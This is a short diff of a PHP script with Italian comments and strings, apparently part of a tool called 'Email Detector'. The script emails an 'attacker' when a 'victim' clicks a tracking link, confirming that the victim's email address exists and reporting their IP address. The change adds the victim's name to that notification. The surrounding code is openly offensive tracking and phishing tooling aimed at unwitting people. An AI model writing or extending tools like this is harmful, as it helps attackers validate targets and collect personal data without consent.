@@ -13,7 +13,7 @@ $email_destinatario = $_POST ['email_destinatario'];
 $rand = rand (0,100000000000000000); //creo la variabile e il numero casuale della pagina
 //IMPOSTO LA MAIL CHE L'ATTACCANTE RICEVERA'
 $oggetto = " \"Convalida Email\" ";
-$messaggio = " \" Ciao, la tua vittima ha confermato che l' email esiste realemente cliccando il link. 
+$messaggio = " \" Ciao, la tua vittima ($nome_destinatario) ha confermato che l' email esiste realemente cliccando il link. 
 Il suo indirizzo ip è: '\$ip'
 Grazie per aver utilizzato Email Detector. \"";
 
